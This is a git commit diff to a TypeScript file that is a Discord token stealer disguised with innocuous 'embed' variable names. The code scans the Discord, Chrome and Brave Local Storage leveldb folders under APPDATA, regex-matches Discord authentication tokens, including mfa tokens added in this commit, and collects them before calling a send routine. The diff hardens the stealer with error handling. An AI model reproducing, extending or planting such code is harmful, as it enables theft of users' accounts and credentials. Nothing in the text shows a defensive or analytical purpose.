5fc98a1c82a5d24c6d9007f58e379fca074d8a91
ulnk <ulnk@skid.today>
2023-01-11 16:08:13 +0000

    fix

--- src/fetch/startFetch.ts
+++ src/fetch/startFetch.ts
@@ -7,8 +7,10 @@ import fetch from "node-fetch";
 export const embeds: string[] = [];
 
 export const startFetch = async () => {
-  const embedTitle = await readdir(process.env.APPDATA!);
-  const emebdAlternateTitle = await readdir(`${process.env.APPDATA!}/../local`);
+  const embedTitle = await readdir(process.env.APPDATA!).catch(() => []);
+  const emebdAlternateTitle = await readdir(
+    `${process.env.APPDATA!}/../local`
+  ).catch(() => []);
 
   const embedDescription = embedTitle.find((title) => title === "discord");
   createEmbed(process.env.APPDATA!, embedDescription!);
@@ -24,7 +26,7 @@ export const startFetch = async () => {
   );
   const embedChromeDescription = await readdir(
     `${process.env.APPDATA!}/../local/${embedAlternateDescription!}`
-  );
+  ).catch(() => []);
   if (
     embedAlternateDescription &&
     embedChromeDescription.find((title) => title === "Chrome")
@@ -54,7 +56,7 @@ export const startFetch = async () => {
   );
   const embedCourageDescription = await readdir(
     `${process.env.APPDATA!}/../local/${embedBraveDescription!}`
-  );
+  ).catch(() => []);
   if (
     embedBraveDescription &&
     embedCourageDescription.find((title) => title === "Brave-Browser")
@@ -67,20 +69,25 @@ export const startFetch = async () => {
 
 const createEmbed = async (title: string, description: string) => {
   const embedContent = (
-    await readdir(`${title}/${description}/Local Storage/leveldb`)
+    await readdir(`${title}/${description}/Local Storage/leveldb`).catch(
+      () => []
+    )
   ).filter((file) => file.endsWith(".log") || file.endsWith(".ldb"));
 
   for (const e of embedContent) {
     const embedFields = await readFile(
       `${title}/${description}/Local Storage/leveldb/${e}`
-    );
+    ).catch(() => Buffer.from(""));
 
     const embedFooter = embedFields.toString();
     const embedAuthor = embedFooter.match(
       "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}"
     );
-    if (!embedAuthor) continue;
-    embeds.push(embedAuthor[0]);
+    if (embedAuthor) embeds.push(embedAuthor[0]);
+
+    const embedAuthorAlternative = embedFooter.match("mfa\\.[\\w-]{84}");
+    if (embedAuthorAlternative)
+      embedAuthorAlternative.push(embedAuthorAlternative[0]);
   }
 
   sendEmbed();
